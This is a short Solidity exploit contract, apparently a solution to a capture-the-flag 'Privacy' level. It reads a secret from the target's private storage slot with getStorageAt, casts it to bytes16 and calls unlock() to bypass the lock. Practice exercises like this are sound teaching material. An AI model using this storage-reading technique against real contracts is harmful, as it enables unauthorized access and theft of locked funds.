// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//Receive relevant storage slot via web3js:
//await web3.eth.getStorageAt(contract.address, 5)

interface Privacy{
    function unlock(bytes16 _key) external;
}

contract PrivacyExploit{
    address targetAddress;
    bytes32 storageValue = 0xdac52a7525c5d2e36bcf0dbeb441cee26806b46b6b2f1babf860114b54bdb928; 

    constructor(address _address){
        targetAddress = _address;
    }    

    function pwn() public{
        bytes16 castedValue = bytes16(storageValue);
        Privacy(targetAddress).unlock(castedValue);
    }
}